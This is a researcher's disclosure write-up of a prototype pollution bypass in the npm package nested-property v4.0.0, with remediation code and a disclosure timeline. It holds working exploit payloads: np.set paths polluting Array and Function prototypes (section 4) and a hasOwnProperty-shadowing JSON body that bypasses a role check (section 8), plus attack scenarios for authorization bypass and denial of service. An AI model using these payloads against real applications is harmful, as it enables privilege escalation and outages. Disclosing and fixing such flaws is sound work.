# Broken Nest: Prototype Pollution Bypass in `nested-property` v4.0.0

**Date:** April 2, 2026  
**Researcher:** Ojas Mehta  
**Package:** [`nested-property`](https://www.npmjs.com/package/nested-property) (NPM) — v4.0.0 (latest)  
**License:** MIT  
**Disclosure status:**
- Snyk: Disclosed April 2, 2026 — advisory declined (classified as JS semantics, not package scope)
- webdav maintainer (Perry Mitchell): Notified April 3, 2026 with full PoC and remediation guidance

> **⚠️ DISCLAIMER:** Snyk has officially declined to issue a security advisory for this vulnerability, classifying it as expected "JavaScript semantics" rather than a package-scoped vulnerability. Automated vulnerability scanners will **not** flag this package as vulnerable. Use at your own risk.

---

## 1. Summary

The v4.0.0 fix for prototype pollution in `nested-property` introduces an **incomplete guard** that only blocks mutation of `Object.prototype`. An attacker can still pollute `Array.prototype` and `Function.prototype` by:

- Using a non-plain-object (`[]`, `{}` with array-rooted path) as the root target
- Traversing through `constructor.__proto__`

All **four attack vectors** below are **confirmed reproducible** on the latest published version (v4.0.0, Node.js v22.22.2).

---

## 2. Installation & Verification

> **Requirements:** Node.js v16 or higher, npm

### Step 1 — Clone this repository

```bash
git clone https://github.com/blah-blah-cell/broken-nest.git
cd broken-nest
```

### Step 2 — Install dependencies

```bash
npm install
```

This installs `nested-property@4.0.0` exactly as pinned in `package.json`. Verify:

```bash
npm list nested-property
# expected: nested-property@4.0.0
```

### Step 3 — Run the PoC

```bash
npm run poc
# or: node pocs/prototype-pollution-poc.js
```

### Expected output

```
=== nested-property v4.0.0 — Prototype Pollution Bypass PoC ===
Researcher: Ojas Mehta | Date: April 2, 2026

--- Vector 1: Array.prototype via __proto__ ---
[1] Array.prototype.polluted: true
[1] Object.prototype.polluted: undefined
[1] [].polluted: true

--- Vector 2: Function.prototype via constructor.__proto__ ---
[2] Function.prototype.polluted: true
[2] (function(){}).polluted: true

--- Vector 3: Array.prototype method hijacking ---
[3] [1,2,3].toString(): HIJACKED
[3] ({}).toString(): [object Object]

--- Vector 4: Array root + constructor.prototype ---
[4] [].injected: owned
[4] ({}).injected: undefined

=== All 4 vectors confirmed. Object.prototype guard bypassed silently. ===
Note: No ObjectPrototypeMutationError was thrown for any of the above.


```

**What to look for:**
- `Array.prototype.polluted: true` — guard bypassed for arrays (Vector 1)
- `Object.prototype.polluted: undefined` — confirms `Object.prototype` is protected, everything else is not
- `[1,2,3].toString(): HIJACKED` — native method silently overridden (Vector 3)

- **No `ObjectPrototypeMutationError` anywhere** — all vectors succeed silently

### Step 4 — Verify the fix

Run the remediation validation script to confirm both proposed defenses block all 4 vectors:

```bash
npm run fix
# or: node fix-recommendation.js
```

### Expected fix output

```
=== Fix Validation ===
[PASS] Vector 1: blocked — Blocked: dangerous path segment in "data.__proto__.polluted"
[PASS] Vector 2: blocked — Blocked: dangerous path segment in "constructor.__proto__.polluted"
[PASS] Vector 3: blocked — Blocked: dangerous path segment in "data.__proto__.toString"
[PASS] Vector 4: blocked — Blocked: dangerous path segment in "constructor.prototype.injected"
[PASS] Safe path allowed: {"user":{"profile":{"name":"Alice"}}}

Fix validation complete.
```

All 4 vectors blocked. Safe paths (no dangerous segments) still pass through correctly.

---

## 3. Root Cause

The guard added in v4.0.0 (`nested-property/dist/nested-property.js`, line 166):

```js
if (currentObject === Reflect.getPrototypeOf({})) {
  throw new ObjectPrototypeMutationError("Attempting to mutate Object.prototype");
}
```

`Reflect.getPrototypeOf({})` returns exactly `Object.prototype`. This is a **strict identity comparison against a single object** — it does not protect any other prototype in the chain:

- `Array.prototype` → **unguarded**
- `Function.prototype` → **unguarded**
- Any other built-in prototype → **unguarded**

---

## 4. Confirmed Attack Vectors (v4.0.0)

### Vector 1 — `Array.prototype` pollution via `__proto__` key

```js
np.set({ data: [] }, "data.__proto__.polluted", true);
// Array.prototype.polluted === true  (ALL arrays in process affected)
// Object.prototype.polluted === undefined  (guard incorrectly considered this "safe")
```

### Vector 2 — `Function.prototype` pollution via `constructor.__proto__`

```js
np.set({}, "constructor.__proto__.polluted", true);
// Function.prototype.polluted === true  (ALL functions in process affected)
// Object.prototype.polluted === undefined
```

### Vector 3 — `Array.prototype` pollution via Array root + `constructor.prototype`

```js
np.set([], "constructor.prototype.injected", "owned");
// [].injected === "owned"  (ALL arrays affected)
// ({}).injected === undefined
```

### Vector 4 — `Array.prototype` method hijacking (highest impact)

```js
np.set({ data: [] }, "data.__proto__.toString", () => "HIJACKED");
// [1,2,3].toString() === "HIJACKED"  — native method silently overridden
// ({}).toString() === "[object Object]"  — plain objects unaffected
```

---

## 5. Full PoC

See [`pocs/prototype-pollution-poc.js`](./pocs/prototype-pollution-poc.js) — runnable on Node.js v16+ with `nested-property@4.0.0`.

**Confirmed output:**
```
[1] Array.prototype.polluted: true
[1] Object.prototype.polluted: undefined
[1] [].polluted: true
[2] Function.prototype.polluted: true
[2] (function(){}).polluted: true
[3] [1,2,3].toString(): HIJACKED
[3] ({}).toString(): [object Object]
[4] [].injected: owned
[4] ({}).injected: undefined
```

---

## 6. Impact

| Impact | Scope | Severity |
|---|---|---|
| Array method hijacking (`toString`, `join`, `map`, `filter`, ...) | All arrays in the Node.js process | High |
| Function.prototype pollution (middleware, handlers, callbacks) | All functions in the process | High |
| Process-wide persistence (survives all requests until restart) | Entire application | Critical |
| Silent — no throw, no log | Unlike `Object.prototype` guard | Critical |

### Real-World Exploitation Scenarios
- **Instant Denial of Service (DoS):** By overwriting an array method like `Array.prototype.map` with a non-function value, the entire Node.js server will crash with a `TypeError` the next time the application maps an array.
- **Defeating Security Filters:** Applications often rely on arrays for whitelists (`allowedRoles.includes(user.role)`). An attacker can pollute `Array.prototype.includes = () => true`, instantly bypassing authorization checks process-wide.
- **Remote Code Execution (RCE):** If the backend renders HTML templates (like Pug, EJS, or Handlebars), an attacker can pollute `Function.prototype` or `Array.prototype.push` to hijack the template compilation engine and inject arbitrary JavaScript, achieving full server compromise.

**Key distinguisher:** The `Object.prototype` guard in v4.0.0 throws a named `ObjectPrototypeMutationError`. These vectors succeed **silently** — no exception is raised, no log is written. Detection requires active monitoring of prototype chains.

---

## 7. Beyond Prototype Pollution: Dangerous Developer Pitfalls

It is important to note that security triage teams and CVE assigning authorities generally classify the following issues not as flaws in `nested-property` itself, but as **developer implementation flaws**. Because `nested-property` is a low-level utility designed specifically to dynamically set properties via strings, its entire purpose is arbitrary manipulation. 

If a developer passes raw, unfiltered user input directly into `nested-property.set()`, they are writing insecure code. The function is simply doing exactly what it was programmed to do. However, developers must be acutely aware of two major pitfalls when using this library:

### Mass Assignment (Privilege Escalation)
If an application uses `nested-property` to apply JSON updates to a backend object (like a User Profile), an attacker can overwrite sibling properties that were not intended to be exposed.
**PoC:** `node pocs/mass-assignment-poc.js`
- **Path:** `"role"`
- **Impact:** An attacker changing their profile theme can silently overwrite their own role to `"superadmin"`, leading to instant Privilege Escalation.

### Type Confusion (Forcing Arrays)
The `nested-property` traversal engine contains logic to implicitly create Arrays if a path segment is numeric:
```javascript
var nextPropIsNumber = Number.isInteger(Number(segments[index + 1]));
if (nextPropIsNumber) { currentObject[currentProperty] = []; }
```
**PoC:** `node pocs/type-confusion-poc.js`
- **Path:** `"settings.0.theme"`
- **Impact:** If `settings` was previously undefined, the engine forcefully instantiates it as an `Array` instead of an `Object`. Any downstream application logic that expects `settings` to be an object (e.g., calling `Object.keys(user.settings)`) will now crash or misbehave, leading to Application Logic Corruption or Denial of Service.

---

## 8. Fail-Open Error Handling (CWE-390) Enables Mass Assignment

Security triage teams generally classify mass assignment as a "developer implementation flaw," asserting that developers must validate input before processing. However, `nested-property` contains a critical logic flaw that undermines this very defense: **Fail-Open Error Handling**.

The library wraps its traversal engine (including the `hasOwn` validation method) in generic `try/catch` blocks that silently swallow `TypeError` exceptions and return `false`.

```javascript
// From nested-property.js hasOwn implementation:
try {
  // ...
  has = currentObject.hasOwnProperty(currentProperty); // POINT OF FAILURE
  // ...
} catch (err) {
  return false; // SILENT FAIL-OPEN
}
```

### Bypassing Developer Validation
An attacker can deliberately trigger this internal `TypeError` by shadowing the `hasOwnProperty` method in a standard JSON payload. This trick causes the library to fail open, returning `false`, and actively lying to the developer's security filter.

Consider a developer securely guarding their profile update endpoint:
```javascript
// Developer correctly validates input to prevent Mass Assignment
if (np.hasOwn(req.body, "role")) {
    return res.status(403).send("Forbidden property");
}

// Since validation passed, apply updates safely
for (const key of Object.keys(req.body)) {
    np.set(req.user, key, req.body[key]);
}
```

The attacker sends:
```json
{
  "role": "admin",
  "hasOwnProperty": 1
}
```

1. `np.hasOwn` tries to call `currentObject.hasOwnProperty("role")`.
2. A `TypeError` is thrown because `1` is not a function.
3. The library's `catch` block swallows the error and silently returns `false`.
4. The security filter is bypassed. The `role` property is successfully overwritten to `admin`.

**PoC:** `node pocs/fail-open-poc.js`
This combined exploit chain definitively proves that the vulnerability lies within `nested-property`'s internal logic, not just developer misuse.

---

## 9. Supply Chain Context

`nested-property` is a transitive dependency of `webdav` v5.9.0 (and other packages). Any application that:

1. Uses `webdav` or similar packages that call `nestedProperty.set()` internally
2. Passes **user-controlled data** through those operations (e.g., WebDAV PROPPATCH, PROPFIND, or resource metadata updates)

...is exposed to process-wide prototype pollution, enabling:

- **Authentication bypass** (if auth checks rely on Array/Function prototype methods downstream)
- **Denial of service** (via method hijacking that causes downstream crashes)
- **Silent data corruption** (polluted methods producing wrong results for all subsequent requests)

---

## 10. Discovery Methodology

1. **Source analysis:** Read `nested-property/dist/nested-property.js`, identified the guard as a single strict identity check against `Reflect.getPrototypeOf({})`.
2. **Guard boundary mapping:** Determined the guard exclusively matches `Object.prototype` — nothing else in the prototype chain.
3. **Vector enumeration:** Systematically tested non-plain-object roots (`[]`, `function(){}`) and indirect traversal paths (`__proto__`, `constructor.__proto__`).
4. **Exploitability confirmation:** Verified method hijacking via `Array.prototype.toString` override; confirmed scope is process-wide and persistent.
5. **Logic Analysis:** Identified generic `try/catch` fail-open blocks in the traversal engine that swallow `TypeErrors`.
6. **Exploit Chain:** Combined the fail-open behavior with property shadowing to demonstrate bypassing developer validation to achieve Mass Assignment.

---

## 11. Remediation

See [`fix-recommendation.js`](./fix-recommendation.js) for full patched implementation.

### Fix 1 — Extend the prototype guard

```js
const PROTECTED_PROTOS = new Set([
  Object.prototype,
  Array.prototype,
  Function.prototype,
  Number.prototype,
  String.prototype,
  Boolean.prototype,
]);

if (PROTECTED_PROTOS.has(currentObject)) {
  throw new Error("Blocked: mutation of built-in prototype");
}
```

### Fix 2 — Segment-level denylist (defense in depth)

```js
const DANGEROUS_KEYS = ["__proto__", "constructor", "prototype"];
const isSafe = (path) => !path.split(".").some(s => DANGEROUS_KEYS.includes(s));
```

### Fix 3 — Remove Generic Catch Blocks
Remove the generic `try/catch` blocks from `hasOwn` and `getNestedProperty`. Errors like `TypeError` must be allowed to propagate to the calling application so it knows the input is invalid. Do not swallow exceptions and return default values.

**All defenses should be applied together.**

---

## 12. Disclosure Timeline

| Date | Action |
|---|---|
| April 2, 2026 | Vulnerability discovered and confirmed on Node.js v22.22.2 |
| April 2, 2026 | Snyk responsible disclosure filed via report@snyk.io |
| April 2, 2026 | MITRE CVE Program request filed (CVE Request 2019608) |
| April 3, 2026 | Direct disclosure to webdav maintainer Perry Mitchell |
| May 4, 2026 | Snyk acknowledges receipt, begins maintainer contact |
| May 11, 2026 | Snyk declines advisory — classifies as JS semantics, not package scope |
| June 4, 2026 | Public disclosure — 60+ days elapsed, no patch or maintainer response |

---

## 13. Status

**Unpatched as of June 4, 2026.** CVE assignment pending (MITRE CVE Request 2019608). The initial prototype pollution advisory was declined by Snyk. A secondary disclosure regarding the CWE-390 Fail-Open vulnerability (bypassing developer validation) has been prepared. Treat all `nested-property` v4.0.0 usage with user-controlled paths or payloads as vulnerable.

---

*Research by Ojas Mehta. For questions, contact via GitHub. See [SECURITY.md](./SECURITY.md) for ethical use policy.*
